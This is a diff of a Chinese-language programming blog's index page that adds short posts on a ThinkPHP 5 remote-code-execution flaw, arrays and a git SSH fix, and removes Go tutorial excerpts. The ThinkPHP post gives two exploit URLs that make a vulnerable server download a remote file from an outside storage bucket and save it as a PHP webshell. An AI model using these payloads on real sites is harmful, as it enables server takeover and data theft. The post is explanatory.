@@ -246,6 +246,169 @@
     <header class="post-header">
       <h1 class="post-title">
         
+          <a class="post-link" href="/2020/05/12/TP5-远程可执行漏洞/">TP5 远程可执行漏洞</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2020-05-12
+        </span>
+        
+          <span class="post-category">
+            
+              <a href="/categories/PHP/">PHP</a>
+            
+          </span>
+        
+        
+      </div>
+    </header>
+
+    
+    
+
+
+    <div class="post-content">
+      
+        
+        
+
+        
+          <h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>在近一个月内，我身边两个朋友公司均遭到了网站挂马攻击，得到不同程度的损失，甚至整库被脱</p>
+<h2 id="模拟现场"><a href="#模拟现场" class="headerlink" title="模拟现场"></a>模拟现场</h2><p>环境版本：<code>thinkphp_5.0.22</code><br>虚拟域名：<code>http://tp5.test.com/</code></p>
+<p>效果图</p>
+<img src="/2020/05/12/TP5-远程可执行漏洞/tp5.png">
+<p>远程执行命令：<code>http://tp5.test.com/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][]=https://test-attack.oss-cn-beijing.aliyuncs.com/php/dm.txt&amp;vars[1][]=t.php</code></p>
+<p>还有其他的变种写法，如：<code>http://tp5.test.com/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][0]=https://test-attack.oss-cn-beijing.aliyuncs.com/php/dm.js&amp;vars[1][1]=/data/www/thinkphp_5.0.22/public/t2.php</code></p>
+<p>执行后页面提示：<code>页面错误！请稍后再试～</code>，如果你真的以为啥也没有发生，那你就是真是 <code>Too young too simple!!</code>，打开你的项目 <code>public</code> 目录，你会欣喜的发现多了俩文件 <code>t.php</code> 和 <code>t2.php</code>，没错这俩就是 <code>PHP</code> 大马。接下来访问这俩大马文件，就可以开启一路狂飙模式。</p>
+<p>上图说话</p>
+<img src="/2020/05/12/TP5-远程可执行漏洞/t1.png">
+<img src="/2020/05/12/TP5-远程可执行漏洞/t2.png">
+<h2 id="类似文章"><a href="#类似文章" class="headerlink" title="类似文章"></a>类似文章</h2><ul>
+<li><a href="http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/" target="_blank" rel="noopener">thinkphp 5.0.24 反序列化漏洞分析</a></li>
+</ul>
+
+        
+      
+    </div>
+
+    
+
+    
+
+  </article>
+
+      
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2020/05/12/线性结构之数组/">线性结构之数组</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2020-05-12
+        </span>
+        
+          <span class="post-category">
+            
+              <a href="/categories/Data-structure/">Data structure</a>
+            
+          </span>
+        
+        
+      </div>
+    </header>
+
+    
+    
+
+
+    <div class="post-content">
+      
+        
+        
+
+        
+          <h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>首先</p>
+<h2 id="随机访问"><a href="#随机访问" class="headerlink" title="随机访问"></a>随机访问</h2><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>The end!</p>
+
+        
+      
+    </div>
+
+    
+
+    
+
+  </article>
+
+      
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          <a class="post-link" href="/2020/05/11/Fix-git-error-Could-not-read-Username-for-github-com/">Fix git error: Could not read Username for github.com</a>
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2020-05-11
+        </span>
+        
+          <span class="post-category">
+            
+              <a href="/categories/Essays/">Essays</a>
+            
+          </span>
+        
+        
+      </div>
+    </header>
+
+    
+    
+
+
+    <div class="post-content">
+      
+        
+        
+
+        
+          <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><code>go get</code> 时遇到以下错误</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% go get github/some/private/repo</span><br><span class="line"></span><br><span class="line">fatal: could not <span class="built_in">read</span> Username <span class="keyword">for</span> <span class="string">'https://github.com'</span>: terminal prompts disabled</span><br><span class="line">package github.com/some/private/repo: <span class="built_in">exit</span> status 128</span><br></pre></td></tr></table></figure>
+<p>尝试 <code>git clone</code> 这个问题依然存在，可以确定是 <code>git</code> 问题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% git <span class="built_in">clone</span> https://github.com/some/private/repo</span><br><span class="line"></span><br><span class="line">fatal: could not <span class="built_in">read</span> Username <span class="keyword">for</span> <span class="string">'https://github.com'</span>: terminal prompts disabled</span><br><span class="line">package github.com/some/private/repo: <span class="built_in">exit</span> status 128</span><br></pre></td></tr></table></figure>
+<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>切换到 <code>ssh</code> 配置如下<br><code>git config --global url.&quot;git@github.com:&quot;.insteadOf &quot;https://github.com/&quot;</code></p>
+<p>检查</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% cat ~/.gitconfig    <span class="comment"># Note, this might be ~/.git/config for you</span></span><br><span class="line">[user]</span><br><span class="line"> email = user@example.com</span><br><span class="line"> name = Example user</span><br><span class="line">[url <span class="string">"git@github.com:"</span>]</span><br><span class="line"> insteadOf = https://github.com/</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://albertech.blogspot.com/2016/11/fix-git-error-could-not-read-username.html" target="_blank" rel="noopener">http://albertech.blogspot.com/2016/11/fix-git-error-could-not-read-username.html</a></li>
+</ul>
+
+        
+      
+    </div>
+
+    
+
+    
+
+  </article>
+
+      
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
           <a class="post-link" href="/2020/05/09/Python-中正则应用/">Python 中正则应用</a>
         
       </h1>
@@ -650,203 +813,6 @@
 <li><code>v, ok := &lt;-ch</code><br>如果通道接收不到数据后 ok 就为 false，这时通道就可以使用 close() 函数来关闭。</li>
 </ul>
 <p>The End!</p>
-
-        
-      
-    </div>
-
-    
-
-    
-
-  </article>
-
-      
-        
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
-          <a class="post-link" href="/2020/05/04/Go-并发/">Go-并发</a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2020-05-04
-        </span>
-        
-          <span class="post-category">
-            
-              <a href="/categories/Go/">Go</a>
-            
-          </span>
-        
-        
-      </div>
-    </header>
-
-    
-    
-
-
-    <div class="post-content">
-      
-        
-        
-
-        
-          <h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>Go 语言支持并发，我们只需要通过 go 关键字来开启 goroutine 即可。</p>
-<p>goroutine 是轻量级线程，goroutine 的调度是由 Golang 运行时进行管理的。</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(m <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"Hello from goroutine %d\n"</span>, m)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> say(i)</span><br><span class="line">    &#125;</span><br><span class="line">    time.Sleep(time.Millisecond)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>换一种匿名函数写法</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span> <span class="params">(m <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">            <span class="keyword">for</span> &#123;</span><br><span class="line">                fmt.Printf(<span class="string">"Hello from goroutine %d\n"</span>, m)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line">    time.Sleep(time.Millisecond)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>任何函数只需加上 <code>go</code> 就能送给调度器运行</li>
-<li>不需要在定义时区分是否是异步函数</li>
-<li>调度器在合适的点进行切换</li>
-<li>使用 <code>-race</code> 如：<code>go run -race goroutine.go</code> 来检测数据访问冲突</li>
-</ul>
-<p>goroutine 可能切换的点</p>
-<ul>
-<li><code>I/O, select</code></li>
-<li><code>channel</code></li>
-<li><code>runtime.Goshed()</code></li>
-<li>函数调用（有时）</li>
-<li>等待锁</li>
-</ul>
-<h2 id="Python-中协程"><a href="#Python-中协程" class="headerlink" title="Python 中协程"></a>Python 中协程</h2><ul>
-<li>使用 <code>yield</code> 关键字实现协程</li>
-<li>Python 3.5 加入了 <code>async def</code> 对协程原生支持</li>
-</ul>
-
-        
-      
-    </div>
-
-    
-
-    
-
-  </article>
-
-      
-        
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
-          <a class="post-link" href="/2020/05/04/Go-错误处理/">Go-错误处理</a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2020-05-04
-        </span>
-        
-          <span class="post-category">
-            
-              <a href="/categories/Go/">Go</a>
-            
-          </span>
-        
-        
-      </div>
-    </header>
-
-    
-    
-
-
-    <div class="post-content">
-      
-        
-        
-
-        
-          <h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">"Hi defer"</span>)</span><br><span class="line">fmt.Println(<span class="string">"abc"</span>)</span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line">abc</span><br><span class="line">Hi <span class="keyword">defer</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="number">2</span>)</span><br><span class="line">fmt.Println(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"error test"</span>)</span><br><span class="line">fmt.Println(<span class="number">4</span>)</span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="built_in">panic</span>: error test</span><br><span class="line"></span><br><span class="line">goroutine <span class="number">1</span> [running]:</span><br><span class="line">main.main()</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<ul>
-<li>确保调用在函数结束时发生</li>
-<li>参数在 <code>defer</code> 语句时计算</li>
-<li><code>defer</code> 列表为后进先出</li>
-</ul>
-<p>何时使用 <code>defer</code> 调用</p>
-<ul>
-<li><code>Open/Close</code></li>
-<li><code>Lock/Unlock</code></li>
-<li><code>PrintHeader/PrintFooter</code></li>
-</ul>
-<h2 id="recover"><a href="#recover" class="headerlink" title="recover"></a>recover</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    test()</span><br><span class="line">    fmt.Println(<span class="string">"Returned normally from test."</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handRecover</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> r := <span class="built_in">recover</span>(); r != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"Recovered in handRecover"</span>, r)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> handRecover()</span><br><span class="line">    fmt.Println(<span class="string">"Calling g."</span>)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">"ERROR"</span>)</span><br><span class="line">    fmt.Println(<span class="string">"Returned normally from test."</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line">Calling g.</span><br><span class="line">Recovered in handRecover ERROR</span><br><span class="line">Returned normally from test.</span><br></pre></td></tr></table></figure>
-<h2 id="panic"><a href="#panic" class="headerlink" title="panic"></a>panic</h2><ul>
-<li>停止当前函数执行</li>
-<li>一直向上返回，执行每一层的 <code>defer</code></li>
-<li>如果没有遇见 <code>recover</code>，程序退出</li>
-</ul>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
-<li><code>panic</code> 抛出一个异常，等同于 <code>python</code> 的 <code>raise</code> 用法类似</li>
-<li><code>recover</code> 捕获异常，等同于 <code>python</code> 的 <code>except</code> 用法类似</li>
-<li><code>defer</code> 会延迟函数到其他函数之后完之后再执行，后面跟的是函数</li>
-</ul>
-<p>golang 的错误处理流程：</p>
-<ul>
-<li>当一个函数在执行过程中出现了异常或遇到 <code>panic()</code>，正常语句就会立即终止，然后执行 <code>defer</code> 语句，再报告异常信息，最后退出 <code>goroutine</code>。</li>
-<li>如果在 <code>defer</code> 中使用了 <code>recover()</code> 函数，则会捕获错误信息，使该错误信息终止报告。</li>
-</ul>
-
-        
-      
-    </div>
-
-    
-
-    
-
-  </article>
-
-      
-        
-  <article class="post">
-    <header class="post-header">
-      <h1 class="post-title">
-        
-          <a class="post-link" href="/2020/05/04/Go-接口/">Go-接口</a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <span class="post-time">
-          2020-05-04
-        </span>
-        
-          <span class="post-category">
-            
-              <a href="/categories/Go/">Go</a>
-            
-          </span>
-        
-        
-      </div>
-    </header>
-
-    
-    
-
-
-    <div class="post-content">
-      
-        
-        
-
-        
-          <p>Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。</p>
-<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><ul>
-<li>定义一个<code>Animal</code>接口，接口里有一个方法<code>cry</code></li>
-<li>分别定义<code>Cat struct</code>和<code>Dog struct</code></li>
-<li>在<code>main</code>里定义<code>Animal</code>类型变量<code>animal</code>，并分别赋值<code>Cat</code>和<code>Dog</code>，然后调用<code>cry()</code>方法</li>
-</ul>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> &#123;</span><br><span class="line">    cry()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(cat Cat)</span> <span class="title">cry</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"I am Cat. 喵喵~"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(dog Dog)</span> <span class="title">cry</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"I am Dog. 旺旺~"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    <span class="keyword">var</span> animal Animal</span><br><span class="line">    animal = <span class="built_in">new</span>(Cat)</span><br><span class="line">    animal.cry()</span><br><span class="line"></span><br><span class="line">    animal = <span class="built_in">new</span>(Dog)</span><br><span class="line">    animal.cry()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line">I am Cat. 喵喵~</span><br><span class="line">I am Dog. 旺旺~</span><br></pre></td></tr></table></figure>
 
         
       
